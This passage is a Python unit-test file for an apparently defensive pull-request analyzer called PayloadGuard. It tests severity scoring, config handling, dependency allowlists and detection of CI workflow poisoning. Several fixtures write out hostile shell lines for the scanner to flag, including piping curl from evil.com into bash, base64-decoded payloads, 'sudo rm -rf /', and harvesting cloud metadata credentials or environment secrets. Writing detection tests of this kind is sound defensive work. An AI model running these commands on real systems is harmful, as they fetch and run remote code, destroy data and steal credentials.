        result = StructuralPayloadAnalyzer(
            original, modified, file_path="config.py",
        ).analyze_structural_drift()
        self.assertIn("SECRET", result.get("deleted_components", []))


# ==============================================================================
# Binary file deletion
# ==============================================================================

class TestBinaryFileDeletion(unittest.TestCase):
    def test_binary_files_do_not_inflate_line_counts(self):
        inner = TestAnalyzeSuccess()
        a = inner._setup_repo([])
        a.repo.git.diff.return_value = "-\t-\tlibrary.so\n0\t8\tnormal.py"
        result = a.analyze()
        self.assertNotIn("error", result)
        self.assertEqual(result["lines"]["added"], 0)
        self.assertEqual(result["lines"]["deleted"], 8)


# ==============================================================================
# Negative branch age (branch newer than target)
# ==============================================================================

class TestNegativeBranchAge(unittest.TestCase):
    def test_branch_newer_than_target_does_not_crash(self):
        a = _make_analyzer()
        t_branch = datetime(2025, 6, 1, tzinfo=timezone.utc)
        t_target = datetime(2025, 1, 1, tzinfo=timezone.utc)

        branch_commit = MagicMock()
        branch_commit.committed_datetime = t_branch
        branch_commit.hexsha = "aabbccdd"

        target_commit = MagicMock()
        target_commit.committed_datetime = t_target
        target_commit.hexsha = "11223344"

        a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
        a.repo.iter_commits.return_value = []

        merge_base_commit = MagicMock()
        merge_base_commit.diff.return_value = []
        merge_base_commit.hexsha = "deadbeef"
        a.repo.merge_base.return_value = [merge_base_commit]
        a.repo.git.diff.return_value = ""

        result = a.analyze()
        self.assertNotIn("error", result)
        self.assertEqual(result["temporal"]["branch_age_days"], 0)

    def test_zero_age_does_not_trigger_age_flag(self):
        a = _make_analyzer()
        v = a._assess_consequence(0, 0, 0, 0)
        self.assertFalse(any("days old" in f for f in v["flags"]))


# ==============================================================================
# Malformed payloadguard.yml
# ==============================================================================

class TestMalformedConfig(unittest.TestCase):
    def test_malformed_yaml_falls_back_to_defaults(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "payloadguard.yml"), "w") as f:
                f.write("thresholds:\n  branch_age_days: [not: {valid\n")
            cfg = load_config(tmpdir)
        self.assertEqual(cfg.thresholds["branch_age_days"], [90, 180, 365])

    def test_empty_yaml_falls_back_to_defaults(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "payloadguard.yml"), "w") as f:
                f.write("")
            cfg = load_config(tmpdir)
        self.assertEqual(cfg.thresholds["branch_age_days"], [90, 180, 365])


# ==============================================================================
# Threshold order validation (§2.6)
# ==============================================================================

class TestThresholdOrderValidation(unittest.TestCase):
    def test_out_of_order_age_thresholds_are_sorted(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "payloadguard.yml"), "w") as f:
                f.write("thresholds:\n  branch_age_days: [365, 90, 180]\n")
            cfg = load_config(tmpdir)
        self.assertEqual(cfg.thresholds["branch_age_days"], [90, 180, 365])

    def test_out_of_order_files_thresholds_are_sorted(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "payloadguard.yml"), "w") as f:
                f.write("thresholds:\n  files_deleted: [50, 10, 20]\n")
            cfg = load_config(tmpdir)
        self.assertEqual(cfg.thresholds["files_deleted"], [10, 20, 50])

    def test_already_ordered_thresholds_unchanged(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "payloadguard.yml"), "w") as f:
                f.write("thresholds:\n  lines_deleted: [1000, 5000, 20000]\n")
            cfg = load_config(tmpdir)
        self.assertEqual(cfg.thresholds["lines_deleted"], [1000, 5000, 20000])


# ==============================================================================
# Critical path scoring (§3.2)
# ==============================================================================

class TestCriticalPathScoring(unittest.TestCase):
    def setUp(self):
        self.a = _make_analyzer()

    def test_zero_critical_deletions_no_bonus(self):
        v = self.a._assess_consequence(0, 0, 0, 0, critical_file_deletions=0)
        self.assertEqual(v["status"], "SAFE")

    def test_small_critical_deletions_adds_two_points(self):
        v = self.a._assess_consequence(0, 0, 0, 0, critical_file_deletions=1)
        self.assertEqual(v["severity_score"], 2)
        self.assertEqual(v["status"], "REVIEW")

    def test_many_critical_deletions_adds_two_points(self):
        v = self.a._assess_consequence(0, 0, 0, 0, critical_file_deletions=6)
        self.assertEqual(v["severity_score"], 2)
        self.assertEqual(v["status"], "REVIEW")

    def test_critical_deletions_combined_reach_caution(self):
        v = self.a._assess_consequence(0, 0, 91, 0, critical_file_deletions=6)
        self.assertEqual(v["status"], "CAUTION")

    def test_critical_path_flag_text_present(self):
        v = self.a._assess_consequence(0, 0, 0, 0, critical_file_deletions=3)
        self.assertTrue(any("critical" in f.lower() for f in v["flags"]))


# ==============================================================================
# Markdown escaping (§5.3)
# ==============================================================================

class TestMarkdownEscaping(unittest.TestCase):
    def test_backtick_in_deleted_filename_escaped(self):
        from analyze import format_markdown_report, _md_escape
        report = _make_full_report(files_deleted=1)
        report["deleted_files"]["critical"] = ["src/`evil`.py"]
        report["deleted_files"]["all"] = ["src/`evil`.py"]
        md = format_markdown_report(report)
        self.assertNotIn("src/`evil`.py", md)
        self.assertIn(_md_escape("src/`evil`.py"), md)

    def test_pipe_in_structural_filename_escaped(self):
        from analyze import format_markdown_report
        report = _make_full_report()
        report["structural"]["flagged_files"] = [{
            "file": "src/mo|dule.py",
            "severity": "CRITICAL",
            "metrics": {"deleted_node_count": 5, "structural_deletion_ratio": 80.0},
            "deleted_components": ["AuthManager"],
        }]
        md = format_markdown_report(report)
        self.assertNotIn("src/mo|dule.py", md)
        self.assertIn("mo\\|dule", md)


# ==============================================================================
# post_check_run.py coverage
# ==============================================================================

class TestPostCheckRun(unittest.TestCase):
    def _import_pcr(self):
        try:
            import post_check_run as pcr
            return pcr
        except BaseException:
            self.skipTest("post_check_run dependencies unavailable in this environment")

    def test_require_env_raises_on_missing_var(self):
        pcr = self._import_pcr()
        env = {k: v for k, v in os.environ.items() if k != "NONEXISTENT_VAR_XYZ123"}
        with patch.dict(os.environ, env, clear=True):
            with self.assertRaises(EnvironmentError):
                pcr._require_env("NONEXISTENT_VAR_XYZ123")

    def test_require_env_returns_stripped_value(self):
        pcr = self._import_pcr()
        with patch.dict(os.environ, {"MY_TEST_VAR_PCR": "  hello  "}):
            self.assertEqual(pcr._require_env("MY_TEST_VAR_PCR"), "hello")

    def test_main_skips_without_app_id(self):
        pcr = self._import_pcr()
        original_get = os.environ.get
        def fake_get(key, default=""):
            if key == "PAYLOADGUARD_APP_ID":
                return ""
            return original_get(key, default)
        with patch("os.environ.get", side_effect=fake_get):
            with patch("builtins.print") as mock_print:
                pcr.main()
                printed = " ".join(str(c) for c in mock_print.call_args_list)
                self.assertIn("skipping", printed.lower())

    def test_malformed_private_key_raises_clear_error(self):
        pcr = self._import_pcr()
        bad_env = {
            "PAYLOADGUARD_APP_ID": "12345",
            "PAYLOADGUARD_PRIVATE_KEY": "not-a-pem-key",
            "PAYLOADGUARD_INSTALLATION_ID": "99999",
            "PR_HEAD_SHA": "abc123",
            "GITHUB_REPOSITORY": "owner/repo",
        }
        with patch.dict(os.environ, bad_env, clear=False):
            with self.assertRaises(EnvironmentError) as ctx:
                pcr.main()
        self.assertIn("PEM", str(ctx.exception))


# ==============================================================================
# Cross-file structural aggregation — dual-condition gate (Fix 1.1)
# ==============================================================================

class TestCrossFileAggregation(unittest.TestCase):
    def _make_structural_diff(self, path, original_code, modified_code):
        d = MagicMock()
        d.change_type = 'M'
        d.b_path = path
        d.a_path = path
        d.a_blob.data_stream.read.return_value = original_code.encode()
        d.b_blob.data_stream.read.return_value = modified_code.encode()
        return d

    def _setup_repo(self, diffs):
        a = _make_analyzer()
        t1 = datetime(2025, 1, 1, tzinfo=timezone.utc)
        t2 = datetime(2025, 3, 1, tzinfo=timezone.utc)
        branch_commit = MagicMock()
        branch_commit.committed_datetime = t1
        branch_commit.hexsha = "aabbccddeeff"
        target_commit = MagicMock()
        target_commit.committed_datetime = t2
        target_commit.hexsha = "112233445566"
        a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
        a.repo.iter_commits.return_value = []
        merge_base = MagicMock()
        merge_base.diff.return_value = diffs
        merge_base.hexsha = "deadbeef00000000"
        a.repo.merge_base.return_value = [merge_base]
        a.repo.git.diff.return_value = ""
        return a

    def test_count_met_but_ratio_low_is_not_critical(self):
        original = '\n'.join(f'def func_{i}(): pass' for i in range(10))
        modified = '\n'.join(f'def func_{i}(): pass' for i in range(1, 10))
        diffs = [self._make_structural_diff(f'mod_{i}.py', original, modified) for i in range(3)]
        result = self._setup_repo(diffs).analyze()
        self.assertNotEqual(result['structural']['overall_severity'], 'CRITICAL')

    def test_both_gates_met_triggers_critical(self):
        original = '\n'.join(f'def func_{i}(): pass' for i in range(5))
        modified = '\n'.join(f'def func_{i}(): pass' for i in range(2, 5))
        diffs = [self._make_structural_diff(f'mod_{i}.py', original, modified) for i in range(2)]
        result = self._setup_repo(diffs).analyze()
        self.assertEqual(result['structural']['overall_severity'], 'CRITICAL')


# ==============================================================================
# YAML error surfacing (Fix 1.3)
# ==============================================================================

class TestMalformedConfigWarning(unittest.TestCase):
    def test_malformed_yaml_emits_warning_to_stderr(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "payloadguard.yml"), "w") as f:
                f.write("thresholds:\n  branch_age_days: [not: {valid\n")
            with patch('sys.stderr', new_callable=StringIO) as mock_stderr:
                cfg = load_config(tmpdir)
            output = mock_stderr.getvalue()
        self.assertIn("WARNING", output)
        self.assertIn("payloadguard.yml", output)
        self.assertEqual(cfg.thresholds["branch_age_days"], [90, 180, 365])


# ==============================================================================
# JS/TS constant and config deletion (Fix 2.1)
# ==============================================================================

class TestStructuralParserJSTS(unittest.TestCase):
    def _nodes(self, source, path):
        try:
            from structural_parser import extract_named_nodes
            return extract_named_nodes(source, path)
        except Exception:
            self.skipTest("tree-sitter JS/TS grammar not available")

    def test_js_const_deletion_detected(self):
        original = "const ROUTES = { home: '/', login: '/login' };\nfunction handle() {}"
        modified = "function handle() {}"
        orig_nodes = self._nodes(original, 'app.js')
        if not orig_nodes:
            self.skipTest("tree-sitter JS grammar not available")
        mod_nodes = self._nodes(modified, 'app.js')
        deleted = orig_nodes - mod_nodes
        self.assertIn('ROUTES', deleted)

    def test_js_arrow_function_const_still_detected(self):
        original = "const handler = () => {};\nconst CONFIG = {};"
        modified = "const CONFIG = {};"
        orig_nodes = self._nodes(original, 'app.js')
        if not orig_nodes:
            self.skipTest("tree-sitter JS grammar not available")
        mod_nodes = self._nodes(modified, 'app.js')
        deleted = orig_nodes - mod_nodes
        self.assertIn('handler', deleted)

    def test_ts_const_deletion_detected(self):
        original = "const AUTH_CONFIG = { secret: 'x' };\nfunction validate() {}"
        modified = "function validate() {}"
        orig_nodes = self._nodes(original, 'auth.ts')
        if not orig_nodes:
            self.skipTest("tree-sitter TS grammar not available")
        mod_nodes = self._nodes(modified, 'auth.ts')
        deleted = orig_nodes - mod_nodes
        self.assertIn('AUTH_CONFIG', deleted)


# ==============================================================================
# Safe markdown truncation (Fix 3.1)
# ==============================================================================

class TestMarkdownTruncation(unittest.TestCase):
    def _truncate(self, content, limit=65_000):
        if len(content) <= limit:
            return content
        content = content[:limit]
        last_nl = content.rfind('\n')
        if last_nl > 0:
            content = content[:last_nl]
        if content.count('```') % 2 == 1:
            content += '\n```'
        return (
            content
            + '\n\n---\n*Report truncated. Full results available '
            'in the `payloadguard-results` artifact.*'
        )

    def test_short_content_returned_unchanged(self):
        content = "# Report\n" * 100
        self.assertEqual(self._truncate(content), content)

    def test_long_content_is_truncated(self):
        content = "x\n" * 40000
        result = self._truncate(content)
        self.assertLess(len(result), 66_000)

    def test_truncation_notice_appended(self):
        content = "x\n" * 40000
        result = self._truncate(content)
        self.assertIn("truncated", result.lower())

    def test_unclosed_code_fence_is_closed(self):
        content = "```python\n" + "code_line\n" * 40000
        result = self._truncate(content)
        self.assertEqual(result.count('```') % 2, 0)

    def test_cuts_at_newline_boundary(self):
        content = ("abcdefghij\n") * 10000
        result = self._truncate(content)
        body = result.split('\n\n---\n')[0]
        self.assertTrue(body.endswith('abcdefghij') or body.endswith('\n'))

    def test_even_fence_count_not_doubled(self):
        content = "```python\ncode\n```\n" + "x\n" * 40000
        result = self._truncate(content)
        self.assertEqual(result.count('```') % 2, 0)


# ==============================================================================
# SCA — dependency manifest scanning (Feature A)
# ==============================================================================

class TestSCAAnalysis(unittest.TestCase):
    def test_parse_pip_packages(self):
        diff = "+requests==2.28.0\n+flask>=2.0\n"
        pkgs = _parse_added_packages(diff, "pip")
        self.assertIn("requests", pkgs)
        self.assertIn("flask", pkgs)

    def test_parse_pip_ignores_removed_lines(self):
        diff = "-old-package==1.0\n+new-package==2.0\n"
        pkgs = _parse_added_packages(diff, "pip")
        self.assertNotIn("old-package", pkgs)
        self.assertIn("new-package", pkgs)

    def test_parse_npm_package(self):
        diff = '+  "lodash": "^4.17.21",\n+  "version": "1.0.0",\n'
        pkgs = _parse_added_packages(diff, "npm")
        self.assertIn("lodash", pkgs)
        self.assertNotIn("version", pkgs)

    def test_parse_go_package(self):
        diff = "+github.com/gin-gonic/gin v1.9.0\n"
        pkgs = _parse_added_packages(diff, "go")
        self.assertIn("github.com/gin-gonic/gin", pkgs)

    def test_parse_cargo_package(self):
        diff = "+serde = { version = \"1.0\" }\n+name = \"myapp\"\n"
        pkgs = _parse_added_packages(diff, "cargo")
        self.assertIn("serde", pkgs)
        self.assertNotIn("name", pkgs)

    def test_parse_ignores_diff_header_line(self):
        diff = "+++ b/requirements.txt\n+requests==2.28.0\n"
        pkgs = _parse_added_packages(diff, "pip")
        self.assertNotIn("b/requirements.txt", pkgs)
        self.assertIn("requests", pkgs)

    def test_load_allowlist_returns_none_when_absent(self):
        with tempfile.TemporaryDirectory() as d:
            result = _load_allowlist(d)
        self.assertIsNone(result)

    def test_load_allowlist_returns_sets(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "allowlist.yml"), "w") as f:
                f.write("python:\n  - requests\n  - flask\n")
            result = _load_allowlist(d)
        self.assertIsNotNone(result)
        self.assertIn("requests", result["python"])

    def test_sca_inactive_without_allowlist(self):
        inner = TestAnalyzeSuccess()
        a = inner._setup_repo([])
        with tempfile.TemporaryDirectory() as d:
            a.repo_path = d
            result = a.analyze()
        self.assertFalse(result["sca"]["allowlist_active"])

    def test_unverified_package_adds_three_to_score(self):
        a = _make_analyzer()
        v_without = a._assess_consequence(0, 0, 0, 0, unverified_dependencies=0)
        v_with = a._assess_consequence(0, 0, 0, 0, unverified_dependencies=1)
        self.assertEqual(v_with["severity_score"] - v_without["severity_score"], 3)


# ==============================================================================
# Complexity advisory — McCabe V(G) (Feature B)
# ==============================================================================

class TestComplexityAdvisory(unittest.TestCase):
    def _analyze(self, original, modified, path="module.py", threshold=15):
        return StructuralPayloadAnalyzer(
            original, modified, file_path=path,
            complexity_threshold=threshold,
        ).analyze_structural_drift()

    def test_simple_function_no_advisory(self):
        modified = "def simple():\n    return 1\n"
        result = self._analyze("", modified)
        self.assertEqual(result["complexity_advisory"], [])

    def test_high_complexity_function_flagged(self):
        body = "\n".join(f"    if x == {i}: pass" for i in range(16))
        modified = f"def complex_fn(x):\n{body}\n"
        result = self._analyze("", modified)
        names = [c["name"] for c in result["complexity_advisory"]]
        self.assertIn("complex_fn", names)

    def test_complexity_value_correct(self):
        body = "\n".join(f"    if x == {i}: pass" for i in range(5))
        modified = f"def fn(x):\n{body}\n"
        result = self._analyze("", modified, threshold=5)
        advisory = [c for c in result["complexity_advisory"] if c["name"] == "fn"]
        self.assertTrue(len(advisory) > 0)
        self.assertEqual(advisory[0]["complexity"], 6)

    def test_advisory_does_not_affect_verdict(self):
        body = "\n".join(f"    if x == {i}: pass" for i in range(16))
        modified = f"def complex_fn(x):\n{body}\n"
        result = self._analyze("", modified)
        self.assertEqual(result["status"], "SAFE")

    def test_existing_function_not_in_advisory(self):
        body = "\n".join(f"    if x == {i}: pass" for i in range(16))
        fn = f"def existing(x):\n{body}\n"
        result = self._analyze(fn, fn)
        self.assertEqual(result["complexity_advisory"], [])

    def test_non_python_file_no_advisory(self):
        result = self._analyze("", "function foo() { if(x){} }", path="app.js")
        self.assertEqual(result["complexity_advisory"], [])

    def test_custom_threshold_respected(self):
        body = "\n".join(f"    if x == {i}: pass" for i in range(5))
        modified = f"def fn(x):\n{body}\n"
        result_low = self._analyze("", modified, threshold=5)
        result_high = self._analyze("", modified, threshold=10)
        self.assertTrue(len(result_low["complexity_advisory"]) > 0)
        self.assertEqual(result_high["complexity_advisory"], [])

    def test_advisory_includes_threshold_value(self):
        body = "\n".join(f"    if x == {i}: pass" for i in range(16))
        modified = f"def big_fn(x):\n{body}\n"
        result = self._analyze("", modified, threshold=10)
        if result["complexity_advisory"]:
            self.assertIn("threshold", result["complexity_advisory"][0])
            self.assertEqual(result["complexity_advisory"][0]["threshold"], 10)


# ==============================================================================
# ADDED FILE CONTENT SCANNING (INC-1, INC-4)
# ==============================================================================

class TestAddedFileContentScanning(unittest.TestCase):
    """Tests for _scan_added_file_content — CI triggers and shell patterns in added non-code files."""

    def _build_added_diff(self, path, content):
        d = MagicMock()
        d.change_type = "A"
        d.b_path = path
        d.b_blob.data_stream.read.return_value = content.encode()
        return d

    def _make_analyzer_with_diffs(self, diffs):
        a = _make_analyzer()
        t1 = datetime(2025, 1, 1, tzinfo=timezone.utc)
        t2 = datetime(2025, 3, 1, tzinfo=timezone.utc)
        branch_commit = MagicMock()
        branch_commit.committed_datetime = t1
        branch_commit.hexsha = "aabbccddeeff"
        target_commit = MagicMock()
        target_commit.committed_datetime = t2
        target_commit.hexsha = "112233445566"
        a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
        a.repo.iter_commits.return_value = []
        merge_base_commit = MagicMock()
        merge_base_commit.diff.return_value = diffs
        merge_base_commit.hexsha = "deadbeef00000000"
        a.repo.merge_base.return_value = [merge_base_commit]
        numstat_lines = []
        for d in diffs:
            path = getattr(d, 'b_path', None) or getattr(d, 'a_path', None) or 'file.txt'
            lines = 0
            if d.change_type == 'A':
                try:
                    lines = len(d.b_blob.data_stream.read().decode('utf-8', errors='ignore').splitlines())
                except Exception:
                    pass
            numstat_lines.append(f"{lines}\t0\t{path}")
        a.repo.git.diff.return_value = "\n".join(numstat_lines)
        return a

    def test_ci_trigger_in_added_md_detected(self):
        d = self._build_added_diff("SETUP.md", "Follow these steps\n[citest commit:abc123]\n")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertIn("content_flags", result)
        self.assertEqual(len(result["content_flags"]), 1)
        self.assertEqual(result["content_flags"][0]["file"], "SETUP.md")
        self.assertTrue(len(result["content_flags"][0]["ci_triggers"]) > 0)

    def test_shell_pattern_in_added_txt_detected(self):
        d = self._build_added_diff("DEPLOY.txt", "Deploy steps:\ncurl http://example.com/setup.sh | bash\n")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(len(result["content_flags"]), 1)
        self.assertTrue(len(result["content_flags"][0]["shell_patterns"]) > 0)

    def test_needs_ci_trigger_detected(self):
        d = self._build_added_diff("notes.txt", "needs-ci run on this branch\n")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(len(result["content_flags"]), 1)
        self.assertTrue(len(result["content_flags"][0]["ci_triggers"]) > 0)

    def test_sudo_command_detected(self):
        d = self._build_added_diff("install.md", "Run: sudo chmod -R 777 /var/app\n")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(len(result["content_flags"]), 1)
        self.assertTrue(len(result["content_flags"][0]["shell_patterns"]) > 0)

    def test_code_file_extension_skipped(self):
        d = self._build_added_diff("setup.py", "[citest] and sudo rm -rf /\n")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["content_flags"], [])

    def test_js_extension_skipped(self):
        d = self._build_added_diff("util.js", "sudo something; [citest]\n")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["content_flags"], [])

    def test_clean_markdown_not_flagged(self):
        d = self._build_added_diff("README.md", "# My Project\n\nThis adds a health check endpoint.\n")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["content_flags"], [])

    def test_content_flag_scores_review(self):
        d = self._build_added_diff("notes.txt", "[citest commit:abc]\n")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertIn(result["verdict"]["status"], ("REVIEW", "CAUTION", "DESTRUCTIVE"))
        self.assertGreater(result["verdict"]["severity_score"], 0)

    def test_multiple_flagged_files_score_accumulates(self):
        d1 = self._build_added_diff("a.txt", "[citest commit:1]\n")
        d2 = self._build_added_diff("b.md", "needs-ci\n")
        a = self._make_analyzer_with_diffs([d1, d2])
        result = a.analyze()
        self.assertEqual(len(result["content_flags"]), 2)
        self.assertGreaterEqual(result["verdict"]["severity_score"], 4)

    def test_decode_error_does_not_crash(self):
        d = MagicMock()
        d.change_type = "A"
        d.b_path = "data.txt"
        d.b_blob.data_stream.read.side_effect = Exception("read error")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertNotIn("error", result)
        self.assertEqual(result["content_flags"], [])

    def test_yaml_file_scanned(self):
        d = self._build_added_diff("config.yml", "run: sudo apt-get install -y pkg\n")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(len(result["content_flags"]), 1)

    def test_both_ci_and_shell_in_same_file(self):
        d = self._build_added_diff("bootstrap.txt", "[citest commit:x]\ncurl http://evil.com | bash\n")
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(len(result["content_flags"]), 1)
        self.assertTrue(len(result["content_flags"][0]["ci_triggers"]) > 0)
        self.assertTrue(len(result["content_flags"][0]["shell_patterns"]) > 0)


# ==============================================================================
# INC-3 — UNVERIFIED flag on non-trivial changeset
# ==============================================================================

class TestINC3UnverifiedFlag(unittest.TestCase):
    """INC-3: UNVERIFIED always flags; SAFE+UNVERIFIED upgrades to REVIEW."""

    def test_unverified_on_destructive_changeset_adds_flag(self):
        a = _make_analyzer()
        result = a._assess_consequence(
            files_deleted=15, lines_deleted=6000, days_old=0,
            deletion_ratio=80.0, structural_severity="LOW",
        )
        self.assertNotEqual(result["status"], "SAFE")
        from analyze import SemanticTransparencyAnalyzer
        semantic = SemanticTransparencyAnalyzer("", diffs=[]).analyze_transparency()
        self.assertEqual(semantic["status"], "UNVERIFIED")
        result["flags"].append("No PR description — semantic transparency unverified")
        self.assertIn("No PR description — semantic transparency unverified", result["flags"])

    def test_unverified_on_safe_changeset_upgrades_to_review(self):
        """INC-3 fix: SAFE + no PR description → REVIEW (flag always surfaces)."""
        t1 = datetime(2025, 6, 1, tzinfo=timezone.utc)
        t2 = datetime(2025, 6, 1, tzinfo=timezone.utc)
        a = _make_analyzer()
        branch_commit = MagicMock()
        branch_commit.committed_datetime = t1
        branch_commit.hexsha = "aabbccddeeff"
        target_commit = MagicMock()
        target_commit.committed_datetime = t2
        target_commit.hexsha = "112233445566"
        a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
        a.repo.iter_commits.return_value = []
        d = MagicMock()
        d.change_type = "A"
        d.b_path = "README.md"
        d.b_blob.data_stream.read.return_value = b"# Hello"
        merge_base_commit = MagicMock()
        merge_base_commit.diff.return_value = [d]
        merge_base_commit.hexsha = "deadbeef00000000"
        a.repo.merge_base.return_value = [merge_base_commit]
        a.repo.git.diff.return_value = "7\t0\tREADME.md"
        result = a.analyze(pr_description="")
        self.assertNotIn("error", result)
        # INC-3 fix: SAFE + UNVERIFIED must become REVIEW
        self.assertEqual(result["verdict"]["status"], "REVIEW")
        self.assertIn(
            "No PR description — semantic transparency unverified",
            result["verdict"]["flags"],
        )

    def test_safe_with_pr_description_stays_safe(self):
        """SAFE + real description → stays SAFE (no false upgrade)."""
        t1 = datetime(2025, 6, 1, tzinfo=timezone.utc)
        t2 = datetime(2025, 6, 1, tzinfo=timezone.utc)
        a = _make_analyzer()
        branch_commit = MagicMock()
        branch_commit.committed_datetime = t1
        branch_commit.hexsha = "aabbccddeeff"
        target_commit = MagicMock()
        target_commit.committed_datetime = t2
        target_commit.hexsha = "112233445566"
        a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
        a.repo.iter_commits.return_value = []
        d = MagicMock()
        d.change_type = "A"
        d.b_path = "README.md"
        d.b_blob.data_stream.read.return_value = b"# Hello"
        merge_base_commit = MagicMock()
        merge_base_commit.diff.return_value = [d]
        merge_base_commit.hexsha = "deadbeef00000000"
        a.repo.merge_base.return_value = [merge_base_commit]
        a.repo.git.diff.return_value = "7\t0\tREADME.md"
        result = a.analyze(pr_description="Add README introduction section")
        self.assertNotIn("error", result)
        self.assertEqual(result["verdict"]["status"], "SAFE")

    def test_unverified_flag_appears_in_full_analyze_no_description(self):
        """End-to-end: no PR description + destructive diff → UNVERIFIED flag in verdict."""
        deleted_content = "\n".join(f"def fn_{i}(): pass" for i in range(200))
        d = MagicMock()
        d.change_type = "D"
        d.a_path = "auth.py"
        d.a_blob.data_stream.read.return_value = deleted_content.encode()

        t1 = datetime(2025, 1, 1, tzinfo=timezone.utc)
        t2 = datetime(2025, 3, 1, tzinfo=timezone.utc)
        a = _make_analyzer()
        branch_commit = MagicMock()
        branch_commit.committed_datetime = t1
        branch_commit.hexsha = "aabbccddeeff"
        target_commit = MagicMock()
        target_commit.committed_datetime = t2
        target_commit.hexsha = "112233445566"
        a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
        a.repo.iter_commits.return_value = []
        merge_base_commit = MagicMock()
        merge_base_commit.diff.return_value = [d]
        merge_base_commit.hexsha = "deadbeef00000000"
        a.repo.merge_base.return_value = [merge_base_commit]
        a.repo.git.diff.return_value = "0\t200\tauth.py"

        result = a.analyze(pr_description="")
        self.assertNotIn("error", result)
        self.assertIn(
            "No PR description — semantic transparency unverified",
            result["verdict"]["flags"],
        )


# ==============================================================================
# GITHUB ACTIONS POISONING DETECTION (Layer 2c)
# ==============================================================================

class TestGitHubActionsPoisoningScanning(unittest.TestCase):
    """Tests for _scan_github_actions_poisoning — Layer 2c signal detection."""

    def _build_workflow_diff(self, path, content, change_type="A"):
        d = MagicMock()
        d.change_type = change_type
        d.b_path = path
        d.a_path = path
        d.b_blob.data_stream.read.return_value = content.encode()
        return d

    def _make_analyzer_with_diffs(self, diffs):
        a = _make_analyzer()
        t1 = datetime(2025, 1, 1, tzinfo=timezone.utc)
        t2 = datetime(2025, 3, 1, tzinfo=timezone.utc)
        branch_commit = MagicMock()
        branch_commit.committed_datetime = t1
        branch_commit.hexsha = "aabbccddeeff"
        target_commit = MagicMock()
        target_commit.committed_datetime = t2
        target_commit.hexsha = "112233445566"
        a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
        a.repo.iter_commits.return_value = []
        merge_base_commit = MagicMock()
        merge_base_commit.diff.return_value = diffs
        merge_base_commit.hexsha = "deadbeef00000000"
        a.repo.merge_base.return_value = [merge_base_commit]
        numstat_lines = []
        for d in diffs:
            path = getattr(d, 'b_path', None) or getattr(d, 'a_path', None) or 'file.yml'
            numstat_lines.append(f"5\t0\t{path}")
        a.repo.git.diff.return_value = "\n".join(numstat_lines)
        return a

    def test_clean_workflow_not_flagged(self):
        content = (
            "name: CI\non:\n  push:\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - uses: actions/checkout@v4\n"
        )
        d = self._build_workflow_diff(".github/workflows/ci.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertNotIn("error", result)
        self.assertEqual(result["actions_poisoning"]["total"], 0)

    def test_base64_payload_detected(self):
        content = (
            "name: Deploy\non:\n  push:\njobs:\n  run:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: echo cGF5bG9hZAo= | base64 -d | bash\n"
        )
        d = self._build_workflow_diff(".github/workflows/deploy.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 1)
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("base64_payload", sig_types)

    def test_base64_payload_severity_is_critical(self):
        content = "run: echo dGVzdA== | base64 -d | bash\n"
        d = self._build_workflow_diff(".github/workflows/evil.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        wf = result["actions_poisoning"]["flagged_workflows"][0]
        self.assertEqual(wf["severity"], "CRITICAL")

    def test_credential_harvest_metadata_endpoint(self):
        content = "run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
        d = self._build_workflow_diff(".github/workflows/harvest.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        self.assertEqual(result["actions_poisoning"]["total"], 1)
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("credential_harvest", sig_types)

    def test_credential_harvest_env_grep(self):
        content = "run: env | grep -i SECRET\n"
        d = self._build_workflow_diff(".github/workflows/leak.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        sig_types = [s['type'] for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]]
        self.assertIn("credential_harvest", sig_types)

    def test_credential_harvest_severity_is_critical(self):
        content = "run: curl http://169.254.169.254/\n"
        d = self._build_workflow_diff(".github/workflows/c.yml", content)
        a = self._make_analyzer_with_diffs([d])
        result = a.analyze()
        wf = result["actions_poisoning"]["flagged_workflows"][0]
        self.assertEqual(wf["severity"], "CRITICAL")

    def test_dormant_trigger_with_shell_exec(self):
        content = (
